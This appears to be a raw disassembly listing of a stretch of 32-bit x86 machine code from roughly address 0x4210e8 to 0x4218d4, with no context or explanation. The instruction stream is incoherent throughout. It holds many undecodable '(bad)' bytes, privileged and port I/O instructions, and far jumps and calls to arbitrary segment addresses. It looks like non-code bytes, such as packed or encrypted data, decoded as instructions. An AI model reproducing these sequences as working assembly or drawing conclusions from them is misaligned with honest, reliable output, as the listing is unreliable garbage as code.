  4210e8:	cli    
  4210e9:	pop    edi
  4210ea:	mov    bl,0x9e
  4210ec:	sbb    al,0x79
  4210ee:	pop    ecx
  4210ef:	or     BYTE PTR [edx+0x28],al
  4210f2:	in     eax,dx
  4210f3:	(bad)  
  4210f4:	stc    
  4210f5:	test   al,0xdb
  4210f7:	mov    bh,0x72
  4210f9:	jmp    0xcc07:0x6cff35e5
  421100:	sti    
  421101:	fwait
  421102:	mov    edx,0x84c53784
  421107:	sub    al,0x99
  421109:	dec    edx
  42110a:	idiv   DWORD PTR [esi-0x337703fa]
  421110:	and    al,0xc3
  421112:	jecxz  0x4210be
  421114:	push   ecx
  421115:	aam    0xc5
  421117:	mov    ah,0xa4
  421119:	xchg   ebx,eax
  42111a:	mov    bl,0xb4
  42111c:	gs aaa 
  42111e:	test   BYTE PTR [eax-0x66045d43],bh
  421124:	cmp    eax,0x60d25439
  421129:	retf   0x494b
  42112c:	ins    DWORD PTR es:[edi],dx
  42112d:	push   0xffffffe8
  42112f:	and    al,0xfe
  421131:	sahf   
  421132:	or     cl,dh
  421134:	popf   
  421135:	jnp    0x421143
  421137:	hlt    
  421138:	jge    0x421172
  42113a:	inc    ebp
  42113b:	mov    eax,0x39239d51
  421140:	ja     0x421165
  421142:	pop    ebp
  421143:	inc    ebx
  421144:	cmp    DWORD PTR [ecx-0x7fd85b41],edi
  42114a:	inc    esp
  42114b:	retf   
  42114c:	inc    ebp
  42114d:	mov    bl,bh
  42114f:	not    DWORD PTR ds:0xd3ffe491
  421155:	xor    bl,dh
  421157:	jno    0x42117e
  421159:	pusha  
  42115a:	mov    edi,0x5c16e1c4
  42115f:	pop    ebp
  421160:	inc    ebp
  421161:	mov    DWORD PTR ds:0x6ff1224a,ecx
  421167:	stos   DWORD PTR es:[edi],eax
  421168:	call   FWORD PTR [esi+0x54c3c73]
  42116e:	jmp    0x4211e5
  421170:	cmp    dh,BYTE PTR [edi+esi*4+0x4]
  421174:	mov    edx,0x68b5f603
  421179:	sbb    cl,BYTE PTR [ebx]
  42117b:	stos   DWORD PTR es:[edi],eax
  42117c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42117d:	call   0x9bfce295
  421182:	aaa    
  421183:	and    DWORD PTR [esi+ebx*2+0x41],esp
  421187:	aam    0x29
  421189:	stos   DWORD PTR es:[edi],eax
  42118a:	in     eax,0x24
  42118c:	repnz push ds
  42118e:	or     DWORD PTR ds:0x164d5fe1,eax
  421194:	(bad)  
  421195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421196:	sti    
  421197:	push   0x27572b92
  42119c:	or     DWORD PTR [edx-0x6e],ecx
  42119f:	imul   esp,DWORD PTR [ebp+0x37a5d03b]
  4211a6:	imul   esp,DWORD PTR [esi+0x6a776aab],0xffffffcf
  4211ad:	cmp    BYTE PTR [eax+0x10058604],0x15
  4211b4:	jae    0x42116d
  4211b6:	mov    eax,0x5fadcc24
  4211bb:	cs jbe 0x42120f
  4211be:	mov    bl,0x77
  4211c0:	and    al,0xb9
  4211c2:	test   BYTE PTR [edx],cl
  4211c4:	inc    ecx
  4211c5:	mov    dl,0xbe
  4211c7:	and    DWORD PTR [ebx+0x10],eax
  4211ca:	repnz mov dh,0x24
  4211cd:	loope  0x421175
  4211cf:	mov    dh,0x87
  4211d1:	test   DWORD PTR [esi-0x2135aa0a],0xaebf29e5
  4211db:	test   eax,0x31efb923
  4211e0:	(bad)  [ebx-0x7cd17464]
  4211e6:	jge    0x421172
  4211e8:	mov    ebp,0x8b778016
  4211ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ee:	xchg   edx,eax
  4211ef:	ss addr16 and al,ch
  4211f3:	fist   DWORD PTR [ecx]
  4211f5:	pop    ss
  4211f6:	mov    edx,0x80b256e4
  4211fb:	ret    
  4211fc:	push   ebp
  4211fd:	sub    dl,BYTE PTR [ebp-0x15]
  421200:	mov    al,ds:0xea9a78be
  421205:	ins    BYTE PTR es:[edi],dx
  421206:	adc    ecx,DWORD PTR [ebx-0x173600f3]
  42120c:	adc    esi,DWORD PTR [edi+esi*2+0x30]
  421210:	xchg   esi,eax
  421211:	lock mov ah,BYTE PTR [esi]
  421214:	jnp    0x421265
  421216:	jp     0x4211b6
  421218:	cmp    esi,DWORD PTR [edx]
  42121a:	mov    ebx,0xb8e568c
  42121f:	loopne 0x42121d
  421221:	dec    edi
  421222:	xchg   BYTE PTR [ebx],cl
  421224:	pop    dx
  421226:	mov    ebp,0xf9b91bd0
  42122b:	jne    0x4211e8
  42122d:	mov    dh,0x4e
  42122f:	test   al,0xf1
  421231:	popf   
  421232:	sub    esp,DWORD PTR [eax]
  421234:	or     edi,esi
  421236:	pusha  
  421237:	push   ss
  421238:	das    
  421239:	fcomip st,st(2)
  42123b:	sahf   
  42123c:	mov    BYTE PTR [ecx],al
  42123e:	mov    al,0xc4
  421240:	out    dx,al
  421241:	outs   dx,DWORD PTR ds:[esi]
  421242:	xor    eax,0x4ba13471
  421247:	push   eax
  421248:	imul   esi,DWORD PTR [edx+0x7],0x2b
  42124c:	je     0x421286
  42124e:	add    al,0x8d
  421250:	ror    BYTE PTR [eax+0x194a24b8],cl
  421256:	mov    bh,0xc8
  421258:	adc    eax,0x21f28f15
  42125d:	cwde   
  42125e:	arpl   WORD PTR [edi-0x784396db],di
  421264:	mov    edi,0x12a26a74
  421269:	add    edi,esi
  42126b:	jb     0x4212a0
  42126d:	mov    al,ds:0xfcb61f2b
  421272:	sbb    eax,0x90a92024
  421277:	mov    esp,0xe9b39d3e
  42127c:	adc    bl,dl
  42127e:	retf   
  42127f:	jmp    0x74d4:0x43e9dc16
  421286:	jl     0x42120e
  421288:	fsubr  QWORD PTR [eax+0x591f1f48]
  42128e:	cld    
  42128f:	push   ds
  421290:	mov    edi,DWORD PTR [ecx]
  421292:	add    al,0xb4
  421294:	jb     0x421233
  421296:	mov    edx,DWORD PTR [eax]
  421298:	bound  eax,QWORD PTR [ecx-0x1fd57879]
  42129e:	jmp    0x421227
  4212a0:	dec    esp
  4212a1:	hlt    
  4212a2:	mov    al,0x24
  4212a4:	sub    ebp,0xf4559eb1
  4212aa:	div    edx
  4212ac:	sub    DWORD PTR [ecx],eax
  4212ae:	adc    al,0x45
  4212b0:	es stc 
  4212b2:	jns    0x421322
  4212b4:	enter  0xeac,0x9c
  4212b8:	sbb    al,0xd6
  4212ba:	sub    dh,dh
  4212bc:	jne    0x421277
  4212be:	mov    ch,0xef
  4212c0:	cwde   
  4212c1:	aas    
  4212c2:	std    
  4212c3:	xor    eax,DWORD PTR [esi-0x71fe3d16]
  4212c9:	imul   ecx,edx,0xb2841d5a
  4212cf:	jns    0x421278
  4212d1:	mov    eax,ds:0x3cee694b
  4212d6:	or     eax,0x6f24e3a1
  4212db:	sbb    esp,DWORD PTR [esi]
  4212dd:	push   eax
  4212de:	mov    al,0x34
  4212e0:	int3   
  4212e1:	daa    
  4212e2:	ds cmp al,0x50
  4212e5:	xchg   ebx,eax
  4212e6:	xchg   ebx,eax
  4212e7:	repnz push ebp
  4212e9:	lahf   
  4212ea:	dec    ebx
  4212eb:	or     eax,0x3ee1bd63
  4212f0:	or     DWORD PTR [ebx+0x19299105],esi
  4212f6:	mov    ebx,0x8c6719ed
  4212fb:	sub    ah,BYTE PTR [ebx+0x17]
  4212fe:	repnz mov edx,DWORD PTR [ebp+0x31]
  421302:	fs out dx,eax
  421304:	call   0x1f9c02b8
  421309:	fnstenv [edi]
  42130b:	dec    esp
  42130c:	add    ah,cl
  42130e:	imul   esp,DWORD PTR [esi-0x65],0xffffff9a
  421312:	mov    edx,esp
  421314:	mov    bh,0x5a
  421316:	mov    edx,0xcff03d31
  42131b:	mov    ecx,DWORD PTR [eax+eax*2-0x44b13b46]
  421322:	mov    eax,0x88fb16be
  421327:	fs stos DWORD PTR es:[edi],eax
  421329:	mov    dh,0x4b
  42132b:	jno    0x421345
  42132d:	sub    BYTE PTR [edx],cl
  42132f:	stos   BYTE PTR es:[edi],al
  421330:	mov    ds:0x5aad5fc,eax
  421335:	out    dx,eax
  421336:	shr    edi,0x41
  421339:	lods   al,BYTE PTR ds:[esi]
  42133a:	pusha  
  42133b:	mov    bh,0x95
  42133d:	pusha  
  42133e:	pop    ebx
  42133f:	repz into 
  421341:	mov    esp,0xca9a6e83
  421346:	jp     0x4213b7
  421348:	inc    edx
  421349:	clc    
  42134a:	mov    edi,0xb77bb5be
  42134f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421351:	loop   0x421390
  421353:	shr    DWORD PTR [ecx+ebp*8],cl
  421356:	pop    esp
  421357:	aam    0x9a
  421359:	enter  0x5975,0xd7
  42135d:	test   DWORD PTR [eax],0xb27045fa
  421363:	jmp    0x4213d5
  421365:	jg     0x42136a
  421367:	aaa    
  421368:	push   ds
  421369:	dec    ecx
  42136a:	out    dx,al
  42136b:	cwde   
  42136c:	addr16 mov esp,eax
  42136f:	retf   0x9d3c
  421372:	retf   
  421373:	(bad)  
  421374:	aam    0x0
  421376:	pop    ds
  421377:	mov    WORD PTR [eax+0x79],cs
  42137a:	lock push edi
  42137c:	jne    0x421353
  42137e:	cmp    edi,DWORD PTR [edx]
  421380:	pop    ds
  421381:	mov    eax,ds:0xb3051f96
  421386:	inc    esp
  421387:	outs   dx,DWORD PTR ds:[esi]
  421388:	add    eax,0x4cf12386
  42138d:	xor    esp,DWORD PTR [eax+eiz*8-0x293686c8]
  421394:	mov    eax,ds:0x73cd0d98
  421399:	adc    al,0xa1
  42139b:	call   0x56593a86
  4213a0:	out    0xa2,eax
  4213a2:	jl     0x4213c1
  4213a4:	mov    DWORD PTR [ecx],esp
  4213a6:	in     eax,0x47
  4213a8:	dec    esi
  4213a9:	and    al,0xad
  4213ab:	add    eax,0xec867659
  4213b0:	mov    dh,0xa2
  4213b2:	or     edi,DWORD PTR [eax+0x92a6562]
  4213b8:	add    dh,BYTE PTR ds:0x5b60eab3
  4213be:	mov    dh,0x44
  4213c0:	push   esi
  4213c1:	mov    ds:0xaa058bb9,eax
  4213c6:	add    al,0xeb
  4213c8:	jge    0x42135a
  4213ca:	(bad)  
  4213cc:	and    cl,cl
  4213ce:	mov    al,ds:0xeb751c69
  4213d3:	push   ebx
  4213d4:	(bad)  
  4213d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d6:	sub    edi,DWORD PTR [edx+ecx*4-0x75497f27]
  4213dd:	mov    bl,0x5e
  4213df:	xchg   DWORD PTR [eax+0x26],ecx
  4213e2:	int    0xe4
  4213e4:	cmp    al,0x6c
  4213e6:	pop    esi
  4213e7:	pusha  
  4213e8:	loop   0x421452
  4213ea:	add    al,BYTE PTR [esi+edx*8]
  4213ed:	gs out dx,eax
  4213ef:	rcr    DWORD PTR [edi],cl
  4213f1:	dec    edi
  4213f2:	mov    ecx,0x2014189c
  4213f7:	xchg   edi,eax
  4213f8:	jb     0x42138a
  4213fa:	nop
  4213fb:	cmc    
  4213fc:	div    BYTE PTR [eax-0x2d0f873d]
  421402:	dec    edi
  421403:	dec    ebx
  421404:	mov    edx,0x7c81bd8b
  421409:	sbb    BYTE PTR [eax+0x56],cl
  42140c:	sub    DWORD PTR [ecx-0xf23ed94],ebx
  421412:	enter  0xd6f1,0x83
  421416:	jp     0x4213ed
  421418:	inc    edi
  421419:	jp     0x421438
  42141b:	leave  
  42141c:	or     esp,DWORD PTR [eax-0x59]
  42141f:	mov    al,ds:0x9daf88ef
  421424:	push   0xffffffb8
  421426:	mov    ch,0xfe
  421428:	in     al,0x5b
  42142a:	(bad)  
  42142c:	xlat   BYTE PTR ds:[ebx]
  42142d:	mov    bl,bl
  42142f:	(bad)  
  421430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421431:	stos   BYTE PTR es:[edi],al
  421432:	mov    edi,0xcf761db4
  421437:	fs pop ss
  421439:	leave  
  42143a:	call   0xf29f4cea
  42143f:	jmp    0x421460
  421441:	cmp    DWORD PTR [esi+0x355ff81],eax
  421447:	(bad)  
  421448:	mov    eax,0x9be33e61
  42144d:	push   cs
  42144e:	cld    
  42144f:	jae    0x421483
  421451:	test   al,0xc6
  421453:	call   DWORD PTR [edi+0x7b]
  421456:	int    0x59
  421458:	mov    bl,0x4e
  42145a:	mov    bh,0xf4
  42145c:	inc    edx
  42145d:	cmp    dh,dl
  42145f:	lods   al,BYTE PTR ds:[esi]
  421460:	push   esi
  421461:	xor    ecx,DWORD PTR ds:0x51c7f7c9
  421467:	lods   al,BYTE PTR ds:[esi]
  421468:	dec    ebp
  421469:	and    edx,esp
  42146b:	dec    esp
  42146c:	(bad)  [eax+0x3d]
  42146f:	pop    ds
  421470:	pop    ebx
  421471:	sar    DWORD PTR [esi-0x7d92dbbc],1
  421477:	inc    edx
  421478:	in     eax,0xc5
  42147a:	xchg   edx,eax
  42147b:	icebp  
  42147c:	in     al,dx
  42147d:	push   edx
  42147e:	repnz cmp eax,0x9365504d
  421484:	mov    edx,0x29d4bf63
  421489:	ficom  DWORD PTR [edx]
  42148b:	fsubp  st(1),st
  42148d:	mul    BYTE PTR [esi]
  42148f:	mov    BYTE PTR [esp+ebx*8],ch
  421492:	mov    esp,0xb9633cec
  421497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421498:	ds or  eax,0xef55d561
  42149e:	mov    edx,0x6bb890e9
  4214a3:	push   ebx
  4214a4:	pop    eax
  4214a5:	push   eax
  4214a6:	push   es
  4214a7:	div    BYTE PTR [eax-0x5b]
  4214aa:	mov    ds:0x5a26bc09,eax
  4214af:	add    DWORD PTR [eax-0x2271d49b],0x5d72fc0b
  4214b9:	dec    edx
  4214ba:	aad    0x54
  4214bc:	(bad)  
  4214bd:	call   0xc95ffcf2
  4214c2:	jbe    0x4214d3
  4214c4:	xor    eax,0xe27dafe3
  4214c9:	loopne 0x4214e4
  4214cb:	jl     0x421472
  4214cd:	popf   
  4214ce:	jmp    0x73566cbd
  4214d3:	xchg   DWORD PTR ds:0x66f6b379,ebx
  4214d9:	loopne 0x4214af
  4214db:	adc    DWORD PTR es:[edx+0xdcd1c3b],ebp
  4214e2:	xchg   ecx,eax
  4214e3:	fild   DWORD PTR [esi]
  4214e5:	push   ds
  4214e6:	dec    edx
  4214e7:	stc    
  4214e8:	sbb    ecx,ebp
  4214ea:	lds    eax,FWORD PTR [ecx]
  4214ec:	lds    ebp,FWORD PTR [edx]
  4214ee:	pop    ebp
  4214ef:	lds    esp,FWORD PTR [eax+0x5c046ba8]
  4214f5:	lock sbb edi,DWORD PTR [edx+0x1]
  4214f9:	stos   DWORD PTR es:[edi],eax
  4214fa:	sub    ebx,DWORD PTR [ebx+0x6a]
  4214fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214fe:	mov    al,0x24
  421500:	(bad)  
  421502:	mov    esi,0x3e69950f
  421507:	out    dx,eax
  421508:	outs   dx,DWORD PTR ds:[esi]
  421509:	pop    es
  42150a:	sub    eax,0x40192299
  42150f:	test   BYTE PTR [ebx+0x41],dl
  421512:	scas   eax,DWORD PTR es:[edi]
  421513:	(bad)  
  421514:	adc    ebx,DWORD PTR [ebx+0x5dedd62b]
  42151a:	dec    ebp
  42151b:	lahf   
  42151c:	popa   
  42151d:	shl    dh,cl
  42151f:	xor    ecx,DWORD PTR [edi]
  421521:	dec    eax
  421522:	mov    dl,0x14
  421524:	mov    al,ds:0x85ceafc4
  421529:	dec    ebx
  42152a:	in     al,dx
  42152b:	lock xor cl,al
  42152e:	out    0xde,eax
  421530:	and    al,0xa9
  421532:	cmp    DWORD PTR [edi],edi
  421534:	jae    0x42154b
  421536:	cld    
  421537:	nop
  421538:	in     al,0x3d
  42153a:	mov    ds:0xc632d5d2,eax
  42153f:	call   0x33675fb
  421544:	sbb    cl,cl
  421546:	fs xchg edi,eax
  421548:	data16 jl 0x42155d
  42154b:	cmp    al,0x4f
  42154d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42154e:	pop    ebx
  42154f:	adc    BYTE PTR [eax-0x6e],bh
  421552:	clc    
  421553:	repz cmp edi,DWORD PTR [esi+0x5d]
  421557:	icebp  
  421558:	pop    es
  421559:	retf   0x74bc
  42155c:	out    dx,al
  42155d:	sub    dl,al
  42155f:	sbb    ch,BYTE PTR [ecx+0x44]
  421562:	cli    
  421563:	jo     0x4214e8
  421565:	enter  0x5cba,0xab
  421569:	add    cl,dl
  42156b:	in     eax,dx
  42156c:	retf   
  42156d:	clc    
  42156e:	xchg   ecx,eax
  42156f:	gs push ebx
  421571:	jmp    0x19ca274c
  421576:	stos   BYTE PTR es:[edi],al
  421577:	and    esi,0x460f6360
  42157d:	(bad)  [edi+ebx*8+0x20]
  421581:	jmp    0xb2e99b6f
  421586:	jl     0x4215c8
  421588:	cli    
  421589:	test   eax,0x52514bf
  42158e:	dec    eax
  42158f:	call   FWORD PTR [eax]
  421591:	out    0x34,eax
  421593:	test   eax,0xe9e75985
  421598:	sbb    al,0x6a
  42159a:	mov    ah,0xb3
  42159c:	xchg   ecx,eax
  42159e:	mov    eax,0xf8d36254
  4215a3:	push   0xffffffc5
  4215a5:	les    ebp,FWORD PTR [edi]
  4215a7:	call   0x7f5c5a70
  4215ac:	and    DWORD PTR [ecx+0x15],ecx
  4215af:	jbe    0x4215ba
  4215b1:	pop    edi
  4215b2:	xchg   ecx,eax
  4215b3:	mov    ds:0x389d9358,al
  4215b8:	into   
  4215b9:	mov    eax,ds:0xccb89033
  4215be:	lods   al,BYTE PTR ds:[esi]
  4215bf:	sar    BYTE PTR [esi+0x5e1190c],1
  4215c5:	push   0xfb92f46c
  4215ca:	fwait
  4215cb:	icebp  
  4215cc:	test   DWORD PTR [ecx-0x516013ad],ebp
  4215d2:	call   0xa3fb4a6f
  4215d7:	js     0x421612
  4215d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215da:	mov    esp,0xd3cb1fe9
  4215df:	int    0x87
  4215e1:	ret    
  4215e2:	loope  0x4215ba
  4215e4:	cmp    esp,ebx
  4215e6:	sub    ah,0x6d
  4215e9:	jns    0x421626
  4215eb:	jnp    0x4215f8
  4215ed:	jge    0x4215a3
  4215ef:	mov    ah,0x51
  4215f1:	sbb    al,0x11
  4215f3:	mov    dh,0x85
  4215f5:	dec    edi
  4215f6:	sbb    bl,dh
  4215f8:	xchg   esp,eax
  4215f9:	mov    DWORD PTR [esi],edx
  4215fb:	pop    esi
  4215fc:	dec    edx
  4215fd:	test   eax,0xf5327620
  421602:	jne    0x421591
  421604:	add    ah,cl
  421606:	shl    ch,1
  421608:	xchg   ebp,eax
  421609:	retf   0xf3a7
  42160c:	lahf   
  42160d:	in     al,dx
  42160e:	sar    dl,cl
  421610:	sbb    ch,BYTE PTR [ecx+0x378145ad]
  421616:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421617:	xor    bl,BYTE PTR [eax]
  421619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42161a:	cmp    ebp,esi
  42161c:	cmp    BYTE PTR [ecx+esi*1-0x45f536bd],dl
  421623:	xchg   ebx,eax
  421624:	stos   DWORD PTR es:[edi],eax
  421625:	or     al,0xd7
  421627:	xor    al,0xa0
  421629:	cdq    
  42162a:	mov    ecx,0xbb9cf1db
  42162f:	dec    ebp
  421630:	repnz sbb DWORD PTR [ebp-0x298cbd4e],edx
  421637:	int    0x96
  421639:	call   0x9a51:0x59a714bf
  421640:	out    0xcc,eax
  421642:	sbb    DWORD PTR [esi-0x172e52b3],ebp
  421648:	and    DWORD PTR [ebp-0x3],0x65
  42164c:	loope  0x42165a
  42164e:	outs   dx,BYTE PTR ds:[esi]
  42164f:	in     eax,0xf6
  421651:	pop    ecx
  421652:	mov    ch,0x28
  421654:	adc    al,cl
  421656:	mov    ch,0xbc
  421658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421659:	xchg   BYTE PTR [ebx],ch
  42165b:	pop    edx
  42165c:	imul   esp,DWORD PTR [esi+0x7e4d8a6c],0x45
  421663:	push   0x38
  421665:	(bad)  
  421666:	mov    esp,0x815c2664
  42166b:	test   al,0x56
  42166d:	mov    ds:0xa5cb5d26,eax
  421672:	mov    edi,DWORD PTR [ebx-0x5692d5fd]
  421678:	push   esp
  421679:	sbb    al,0xbd
  42167b:	xor    al,0xa1
  42167d:	js     0x42166d
  42167f:	cs and eax,0xf2f45f70
  421685:	nop
  421686:	imul   ebp,ebx,0x26
  421689:	xor    edx,edi
  42168b:	jb     0x4216a6
  42168d:	stc    
  42168e:	ins    BYTE PTR es:[edi],dx
  42168f:	enter  0x4d0e,0xe1
  421693:	jl     0x4216da
  421695:	jl     0x4216e1
  421697:	icebp  
  421698:	push   ecx
  421699:	add    eax,0xc9186121
  42169e:	xchg   BYTE PTR [eax-0x62],dh
  4216a1:	ds pop esi
  4216a3:	inc    BYTE PTR [ebx+ebx*4+0x7b]
  4216a7:	cmp    BYTE PTR [ebx+0x66579377],bh
  4216ad:	add    ebp,edx
  4216af:	js     0x4216c6
  4216b1:	push   eax
  4216b2:	mov    ecx,0x61a32914
  4216b7:	pop    ss
  4216b8:	xchg   ebp,eax
  4216b9:	(bad)  
  4216ba:	sbb    ah,ch
  4216bc:	enter  0x182f,0x58
  4216c0:	and    al,0x69
  4216c2:	sbb    DWORD PTR [ebx+0x657d1d55],0x556ba575
  4216cc:	lods   al,BYTE PTR ds:[esi]
  4216cd:	jecxz  0x421740
  4216cf:	push   esp
  4216d0:	icebp  
  4216d1:	xchg   ebx,eax
  4216d2:	mov    bl,0xd3
  4216d4:	test   al,0x36
  4216d6:	jne    0x42171e
  4216d8:	jne    0x421728
  4216da:	pop    edx
  4216db:	hlt    
  4216dc:	jb     0x4216fc
  4216de:	pop    ecx
  4216df:	aaa    
  4216e0:	push   esi
  4216e1:	mov    ecx,0x9d702e0a
  4216e6:	xor    edx,DWORD PTR [esi+0x3dbf31c3]
  4216ec:	(bad)  
  4216ed:	scas   eax,DWORD PTR es:[edi]
  4216ee:	jnp    0x4216e8
  4216f0:	out    0x34,eax
  4216f2:	ins    DWORD PTR es:[edi],dx
  4216f3:	in     al,dx
  4216f4:	jecxz  0x4216dd
  4216f6:	cs int3 
  4216f8:	aad    0xa1
  4216fa:	fwait
  4216fb:	xchg   ecx,eax
  4216fc:	(bad)  
  4216fd:	sti    
  4216fe:	jmp    0x53ba:0x428a02b1
  421705:	jecxz  0x4216c3
  421707:	inc    esp
  421708:	sahf   
  421709:	jae    0x4216d0
  42170b:	mov    ebp,0xdd7b37a6
  421710:	and    DWORD PTR [ecx-0x1a],ebx
  421713:	mov    bh,0x62
  421715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421717:	add    DWORD PTR [esi],edx
  421719:	mov    bh,0xb3
  42171b:	test   ah,al
  42171d:	icebp  
  42171e:	lds    ecx,FWORD PTR [eax-0xb9a525b]
  421724:	mov    ds:0xb3e851c7,al
  421729:	mov    DWORD PTR ds:0x4ba3fd1d,ebp
  42172f:	mov    gs,esi
  421731:	pop    esi
  421732:	(bad)  
  421733:	dec    eax
  421734:	dec    ebp
  421735:	mov    ds:0xf4891dbb,eax
  42173a:	shl    BYTE PTR [ecx-0x5f],1
  42173d:	sahf   
  42173e:	mov    WORD PTR [eax],es
  421740:	je     0x4216f3
  421742:	xchg   edi,eax
  421743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421744:	sub    edx,edx
  421746:	(bad)
  421749:	mov    DWORD PTR [edi-0x79],ebp
  42174c:	push   ss
  42174d:	pop    ecx
  42174e:	push   edx
  42174f:	not    DWORD PTR [ebp+0x4e]
  421752:	xor    edi,DWORD PTR [ebx]
  421754:	sbb    al,0x29
  421756:	nop
  421757:	ja     0x4217ca
  421759:	sbb    cl,0xc1
  42175c:	adc    DWORD PTR [edx+ecx*1-0x84c8a85],esp
  421763:	repnz loop 0x421749
  421766:	sub    BYTE PTR [eax-0x171bc507],0x22
  42176d:	and    DWORD PTR [edx+0x1a],ebp
  421770:	add    al,0xaa
  421772:	and    BYTE PTR [edx-0x18645e30],ch
  421778:	mov    WORD PTR [ecx+0x3f0d5df4],cs
  42177e:	xor    cl,BYTE PTR [ebp+0x60]
  421781:	mov    ds:0xe83844b1,eax
  421786:	pusha  
  421787:	jno    0x4217df
  421789:	add    DWORD PTR [ebx+0x56d05158],ecx
  42178f:	std    
  421790:	xchg   BYTE PTR [ecx-0x51],bl
  421793:	mov    BYTE PTR [ebx+0x3cd46693],ah
  421799:	inc    edi
  42179a:	mov    ebp,0xcf0885a9
  42179f:	jmp    0x4921:0x333001e6
  4217a6:	scas   al,BYTE PTR es:[edi]
  4217a7:	and    DWORD PTR [eax-0x5e],esi
  4217aa:	(bad)  
  4217ab:	fst    st(7)
  4217ad:	fwait
  4217ae:	mov    esp,DWORD PTR [ebx]
  4217b0:	test   BYTE PTR ds:0x182df0df,0x42
  4217b7:	jecxz  0x42174a
  4217b9:	scas   al,BYTE PTR es:[edi]
  4217ba:	mov    dl,0xa4
  4217bc:	pop    eax
  4217bd:	dec    edx
  4217be:	imul   esi,DWORD PTR [ebp-0xccf0f2b],0x921479ae
  4217c8:	sbb    al,0x9
  4217ca:	lods   al,BYTE PTR ds:[esi]
  4217cb:	mov    dh,0x21
  4217cd:	mov    cl,dl
  4217cf:	adc    eax,0x505b992a
  4217d4:	jl     0x4217d8
  4217d6:	sub    cl,BYTE PTR [eax-0x64]
  4217d9:	imul   eax,DWORD PTR [eax-0x7c494cf6],0x68
  4217e0:	sub    ebp,DWORD PTR [ebp+edx*8+0x16]
  4217e4:	fild   DWORD PTR [esi+0xa]
  4217e7:	in     eax,0x6d
  4217e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217ea:	sub    edx,DWORD PTR [ebx]
  4217ec:	lods   eax,DWORD PTR ds:[esi]
  4217ed:	inc    edi
  4217ee:	out    0x7b,al
  4217f0:	add    ah,BYTE PTR [edx+0x74]
  4217f3:	mov    dl,0xff
  4217f5:	xor    al,0xb4
  4217f7:	xor    al,0x55
  4217f9:	inc    ebp
  4217fa:	jnp    0x4217ff
  4217fc:	mov    dh,0x5
  4217fe:	rcl    BYTE PTR [eax+esi*2-0x5d],0xf7
  421803:	inc    ebp
  421804:	cwde   
  421805:	cmp    eax,0xdaa3742a
  42180a:	mov    ch,0xc4
  42180c:	and    eax,DWORD PTR [eax+eax*2-0x2db9c9ff]
  421813:	int3   
  421814:	push   esp
  421815:	addr16 xchg edx,eax
  421817:	aas    
  421818:	lahf   
  421819:	add    eax,0x4b14603b
  42181e:	ret    
  42181f:	es push ds
  421821:	stc    
  421822:	jb     0x4217aa
  421824:	idiv   DWORD PTR [ecx+0x74]
  421827:	iret   
  421828:	cmc    
  421829:	cmp    eax,0xa269f48f
  42182e:	xchg   ebx,eax
  42182f:	shl    BYTE PTR [edx],cl
  421831:	fldcw  WORD PTR [eax]
  421833:	mov    ah,0xeb
  421835:	jno    0x42184d
  421837:	retf   
  421838:	mov    edx,0xe5ac8f5f
  42183d:	mov    al,ds:0xe443978b
  421842:	sbb    DWORD PTR [ebx+0x12],0xffffffb8
  421846:	test   ah,0xc5
  421849:	mov    edx,0xc07f8598
  42184e:	arpl   bx,di
  421850:	pusha  
  421851:	clc    
  421852:	(bad)  
  421853:	aad    0x35
  421855:	jge    0x42186e
  421857:	in     eax,0xb5
  421859:	dec    DWORD PTR [ebp+0x25092228]
  42185f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421860:	pop    eax
  421861:	inc    esi
  421862:	das    
  421863:	or     al,0xe3
  421865:	popf   
  421866:	fild   DWORD PTR [ebp+0x4a]
  421869:	jo     0x421834
  42186b:	imul   esi,DWORD PTR [ecx+0x7f4fd952],0x9c64d33e
  421875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421876:	scas   eax,DWORD PTR es:[edi]
  421877:	xor    eax,edx
  421879:	push   ss
  42187a:	int3   
  42187b:	push   edi
  42187c:	les    eax,FWORD PTR [ebx]
  42187e:	dec    ebp
  42187f:	push   ebx
  421880:	ror    ah,cl
  421882:	cwde   
  421883:	jmp    0x509d61aa
  421888:	fwait
  421889:	int3   
  42188a:	cld    
  42188b:	cmp    DWORD PTR [edx-0x67],ebp
  42188e:	jnp    0x4218d4
  421890:	mov    ch,0xb3
  421892:	int    0x73
  421894:	cld    
  421895:	push   ecx
  421896:	sub    ebx,eax
  421898:	jg     0x421840
  42189a:	cmp    edi,DWORD PTR [eax-0x4a]
  42189d:	xlat   BYTE PTR ds:[ebx]
  42189e:	push   eax
  42189f:	mov    ebp,0x853ba2d0
  4218a4:	mov    bh,0x9d
  4218a6:	stc    
  4218a7:	out    dx,eax
  4218a8:	xor    ecx,ebx
  4218aa:	cmc    
  4218ab:	push   cs
  4218ac:	in     al,dx
  4218ad:	xor    bh,BYTE PTR [ecx+0x74c75864]
  4218b3:	(bad)  
  4218b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218b5:	mov    ah,0xda
  4218b7:	jmp    0x4218ef
  4218b9:	xor    al,0x1f
  4218bb:	cwde   
  4218bc:	and    ebp,DWORD PTR [ecx+0x49e51d00]
  4218c2:	js     0x421928
  4218c4:	dec    esp
  4218c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218c6:	jmp    0x421852
  4218c8:	into   
  4218c9:	pop    esi
  4218ca:	mov    ecx,0xe9f9951f
  4218cf:	push   es
  4218d0:	(bad)  
  4218d1:	(bad)  
  4218d2:	mov    ch,0x74
  4218d4:	adc    al,0x1d
